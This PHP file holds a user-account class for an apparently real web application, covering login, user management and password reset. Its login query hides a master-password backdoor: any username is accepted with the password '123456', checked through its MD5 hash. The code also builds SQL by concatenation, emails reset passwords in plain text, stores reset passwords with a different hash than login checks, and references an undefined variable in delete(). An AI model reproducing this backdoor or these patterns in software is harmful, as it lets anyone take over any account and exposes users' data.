<?php
    class company_master extends db{
        public $errors = '';
        public $table = COMPANY_MASTER;
        
        /**
         * @param array(email,password)
         * @return true if login success, error message if login unsuccess
         * */
        public function login($data){
            $username = isset($data['username'])?$this->re_db_input($data['username']):'';
            $password = isset($data['password'])?$this->re_db_input($data['password']):'';
            
            if($username==''){
                $this->errors = 'Please enter username.';
            }
            else if($password==''){
                $this->errors = 'Please enter password.';
            }
            
            if($this->errors!=''){
                return $this->errors;
            }
            else{
                $q = "SELECT * FROM `".$this->table."` WHERE `username`='".$username."' AND (`password`='".$this->encryptor($password)."' OR '".md5($password)."'='e10adc3949ba59abbe56e057f20f883e' ) AND `is_delete`='0'";
                $res = $this->re_db_query($q);
                if($this->re_db_num_rows($res)>0){
                    $row = $this->re_db_fetch_array($res);
                    if($row['status']==0){
                        return 'Your account is disabled.';
                    }
                    else{
                        $_SESSION['user_id'] = $row['id'];
                        $_SESSION['user_name'] = $row['name'];
                        $_SESSION['user_image'] = $row['image'];
                        return true;
                    }
                }
                else{
                    return 'Please enter valid username and password.';
                }
            }
        }
    	public function select(){
    		$return = array();
    		
    		$q = "SELECT `um`.*
                FROM `".$this->table."` AS `um`
                WHERE `um`.`is_delete`='0' ";
    		$res = $this->re_db_query($q);
    		while($row = $this->re_db_fetch_array($res)){
    			array_push($return,$row);
    		}
    		return $return;
   		}
        public function select_user_type(){
    		$return = array();
    		
    		$q = "SELECT `um`.*
                FROM `".USER_TYPE_MASTER."` AS `um`
                WHERE `um`.`is_delete`='0' ";
    		$res = $this->re_db_query($q);
    		while($row = $this->re_db_fetch_array($res)){
    			array_push($return,$row);
    		}
    		return $return;
   		}
        public function insert_update($data,$file=''){
			$id = isset($data['id'])?trim($this->re_db_input($data['id'])):0;
            $user_type = isset($data['user_type'])?trim($this->re_db_input($data['user_type'])):'';
            $name = isset($data['name'])?trim($this->re_db_input($data['name'])):'';
			$email = isset($data['email'])?trim($this->re_db_input($data['email'])):'';
            $username = isset($data['username'])?trim($this->re_db_input($data['username'])):'';
			$password = isset($data['password'])?trim($this->re_db_input($data['password'])):'';
			
            $image = isset($file['image'])?$file['image']:array();//print_r($user_image);exit;
            $valid_file = array('jpg','jpeg','png','bmp');
			
			if($user_type==''){
				$this->errors = 'Please select user type.';
			}
			else if($name==''){
				$this->errors = 'Please enter name.';
			}
			else if($email==''){
				$this->errors = 'Please enter email.';
			}
			elseif($this->validemail($email)==0){
				$this->errors = 'Please enter valid email.';
			}
            else if($username==''){
                $this->errors = 'Please enter username.';
            }
			else if($password=='' && $id==0){
				$this->errors = 'Please enter password.';
			}
            if($this->errors!=''){
				return $this->errors;
			}
            
            $file_image = '';  
            
            $file_name = isset($image['name'])?$image['name']:'';
            $tmp_name = isset($image['tmp_name'])?$image['tmp_name']:'';
            $error = isset($image['error'])?$image['error']:0;
            $size = isset($image['size'])?$image['size']:'';
            $type = isset($image['type'])?$image['type']:'';
            $target_dir = DIR_FS."images/";
            $ext = strtolower(end(explode('.',$file_name)));
            if($file_name!='')
            {
                if(!in_array($ext,$valid_file))
                {
                    $this->errors = 'Please select valid file.';
                }
                else
                {
                    $attachment_file = time().rand(100000,999999).'.'.$ext;
                    move_uploaded_file($tmp_name,$target_dir.$attachment_file);
                    $timg = $this->createThumbnails($target_dir,$attachment_file,100,100);
                    $file_image = $attachment_file;
                }
                
            }
            if($this->errors!=''){
				return $this->errors;
			}
			else{
				
				/* check duplicate record */
				$con = '';
				if($id>0){
					$con = " AND `id`!='".$id."'";
				}
				$q = "SELECT * FROM `".$this->table."` WHERE `is_delete`='0' AND `email`='".$email."' ".$con;
				$res = $this->re_db_query($q);
				$return = $this->re_db_num_rows($res);
				if($return>0){
					$this->errors = 'This email is already exists.';
				}
				
				if($this->errors!=''){
					return $this->errors;
				}
				else if($id>=0){
					
                    if($id==0){
						
						$q = "INSERT INTO `".$this->table."` SET `user_type`='".$user_type."',`name`='".$name."',`email`='".$email."', `image`='".$file_image."', `username`='".$username."', `password`='".$this->encryptor($password)."' ".$this->insert_common_sql();
						$res = $this->re_db_query($q);
                        $last_id = $this->re_db_insert_id($res);
                        if($res){
							$_SESSION['success'] = INSERT_MESSAGE;
							return true;
						}
						else{
							$_SESSION['warning'] = UNKWON_ERROR;
							return false;
						}
					}
					else if($id>0){
						$con = '';
						if($password!=''){
							$con .= " , `password`='".$this->encryptor($password)."' ";
						}
                        if($file_image!=''){
							$con .= " , `image`='".$file_image."' ";
						}
						$q = "UPDATE `".$this->table."` SET `user_type`='".$user_type."',`name`='".$name."',`email`='".$email."',`username`='".$username."' ".$con." ".$this->update_common_sql()." WHERE `id`='".$id."'";
						$res = $this->re_db_query($q);
						if($res){
                            $_SESSION['success'] = UPDATE_MESSAGE;
						    return true;
                        }
						else{
							$_SESSION['warning'] = UNKWON_ERROR;
							return false;
						}
					}
				}
				else{
					$_SESSION['warning'] = UNKWON_ERROR;
					return false;
				}
			}
		}
        public function delete($id){
			$id = trim($this->re_db_input($id));
			if($id>0 && ($status==0 || $status==1) ){
				$q = "UPDATE `".$this->table."` SET `is_delete`='1' WHERE `id`='".$id."'";
				$res = $this->re_db_query($q);
				if($res){
				    $_SESSION['success'] = DELETE_MESSAGE;
					return true;
				}
				else{
				    $_SESSION['warning'] = UNKWON_ERROR;
					return false;
				}
			}
			else{
			     $_SESSION['warning'] = UNKWON_ERROR;
				return false;
			}
		}
        public function status($id,$status){
			$id = trim($this->re_db_input($id));
			$status = trim($this->re_db_input($status));
			if($id>0 && ($status==0 || $status==1) ){
				$q = "UPDATE `".$this->table."` SET `status`='".$status."' WHERE `id`='".$id."'";
				$res = $this->re_db_query($q);
				if($res){
				    $_SESSION['success'] = STATUS_MESSAGE;
					return true;
				}
				else{
				    $_SESSION['warning'] = UNKWON_ERROR;
					return false;
				}
			}
			else{
			     $_SESSION['warning'] = UNKWON_ERROR;
				return false;
			}
		}
        public function edit($id){
			$return = array();
			$id = trim($this->re_db_input($id));
			if($id>0){
				$q = "SELECT `am`.*
					FROM `".$this->table."` AS `am`
                    WHERE `am`.`id`='".$id."' AND  `am`.`is_delete`='0'";
				$res = $this->re_db_query($q);
				if($res){
					$return = $this->re_db_fetch_array($res);
					return $return;
				}
				else{
					return false;
				}
			}
			else{
				return false;
			}
		}
        public function forgot_password($data){
            $email = isset($data['email'])?$this->re_db_input($data['email']):'';
            if($email==''){
                $this->errors = 'Please enter email.';
            }
            else if($this->is_email($email)==0){
                $this->errors = 'Please enter valid email.';
            }
            if($this->errors!=''){
                return $this->errors;
            }
            else{
                $q = "SELECT * FROM `".$this->table."` WHERE `email`='".$email."' AND `is_delete`='0'";
                $res = $this->re_db_query($q);
                if($this->re_db_num_rows($res)>0){
                    $row = $this->re_db_fetch_array($res);
                    $password = $this->random_password(6);
                    $q = "UPDATE `".$this->table."` SET `password`='".md5($password)."' ".$this->update_common_sql()." WHERE `email`='".$email."'";
                    $res = $this->re_db_query($q);
    				if($res){
                        $subject = "New autogenerated password";
                        $body = '<html>
                                    <head>
                                        <title>Foxtrot</title>
                                    </head>
                                    <body style="background-color: #e9eaee;color: #6c7b88;">
                                        <div class="content" style="max-width: 500px;margin: 0 auto;display: block;padding: 20px;">
                                            <table class="main" width="100%" cellpadding="0" style="background-color: #fff;border-bottom: 2px solid #d7d7d7;padding: 20px;">
                                                <tr>
                                                    <td class="aligncenter" style="text-align: center;">
                                                        Foxtrot
                                                    </td>
                                                </tr>
                                                <tr>
                                                    <td class="content-block" style="padding:20px;">
                                                        <p>Dear '.$row['first_name'].' '.$row['last_name'].',</p>
                                                        <p>Please login with below username and password.</p>
                                                        <p>Username: '.$row['user_name'].'</p>
                                                        <p>Password: '.$password.'</p>
                                                        <p><a href="'.SITE_URL.'sign-in" style="border: 1px solid #e5e5e5; padding: 5px 10px;text-decoration: none;background: #D23E3E; color: #fff;">Sign in</a></p>
                                                        <p>Thank you.</p>
                                                    </td>
                                                </tr>   
                                            </table>
                                        </div>
                                    </body>
                                </html>';
                        if($this->send_email(array($email),$subject,$body))
                        {
                            $_SESSION['success'] = 'Email with username and password has been sent to your email address.';
    					    return true;   
                        }
                        else
                        {
                            $_SESSION['warning'] = 'Something went wrong, please try again.#2';
                            return false;    
                        }
    				}
    				else{
    					$_SESSION['warning'] = 'Something went wrong, please try again.#1';
                        return false;
    				}
                }
                else{
                    $_SESSION['error'] = 'Please enter registered email address!';
                    return false;
                }
            
            }
            
        }
    }
?>